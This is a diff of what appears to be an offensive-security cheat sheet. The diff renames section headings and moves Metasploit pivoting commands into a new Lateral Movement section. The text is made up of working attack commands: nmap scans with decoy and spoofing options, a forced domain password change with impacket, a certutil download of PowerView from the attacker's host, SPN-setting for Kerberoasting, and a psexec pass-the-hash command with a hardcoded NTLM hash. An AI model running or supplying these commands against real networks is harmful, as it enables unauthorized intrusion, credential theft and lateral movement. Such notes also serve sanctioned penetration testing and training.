@@ -7,7 +7,7 @@ sudo nmap -Pn -n -sU "$TARGET" -p- -D 8.8.8.8 -g53 --min-rate 500 --max-rate 150
 sudo nmap -Pn -n -sS "$TARGET" -p- -D 8.8.8.8 -g53 --min-rate 500 --max-rate 1500 --spoof-mac 089E08
 sudo nmap -Pn -n -sU "$TARGET" -p- -D 8.8.8.8 -g53 --min-rate 500 --max-rate 1500 --spoof-mac 089E08
 
-# Enumeration
+# Information Gathering
 ## nmap
 sudo nmap -Pn -n -sC "$TARGET" -p22,80,445 -D 8.8.8.8 -g53 --min-rate 500 --max-rate 1500 --spoof-mac 089E08
 
@@ -305,7 +305,7 @@ sessions -i 1
 [*] impacket
 impacket-changepasswd -debug -dc-ip $TARGET $DC/'$USERNAME':'$PASSWORD'@$TARGET -newpass 'NewPassword123!'
 
-# Escalation 
+## Post-Exploitation 
 
 ## Upgrade TTY
 python3 -c 'import pty; pty.spawn("/bin/bash")';
@@ -387,9 +387,6 @@ background
 sessions
 sessions -i 1
 ipconfig
-run post/multi/manage/autoroute SUBNET=10.10.10.0 ACTION=add
-run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
-msfconsole -q -x "use exploit/windows/smb/psexec; set LHOST 10.10.10.3; set RHOSTS 10.10.10.1-3; set SMBUser Administrator; set SMBPass be77c30f5bb90694f6fd9e48f380c9c3:6aa6bca0dafa60871fa5ecaf2217e05f; run"
 
 [*] Powerview
 powershell -c "certutil -urlcache -f http://$MYIP:8088/powerview.ps1 C:\programdata\powerview.ps1"
@@ -397,3 +394,9 @@ powershell Import-Module C:\programdata\powerview.ps1
 Get-NetDomain
 Get-LocalUser
 Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET
+
+# Lateral Movement
+[*] Metasploit
+run post/multi/manage/autoroute SUBNET=10.10.10.0 ACTION=add
+run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
+msfconsole -q -x "use exploit/windows/smb/psexec; set LHOST 10.10.10.3; set RHOSTS 10.10.10.1-2; set SMBUser Administrator; set SMBPass be77c30f5bb90694f6fd9e48f380c9c3:6aa6bca0dafa60871fa5ecaf2217e05f; run"
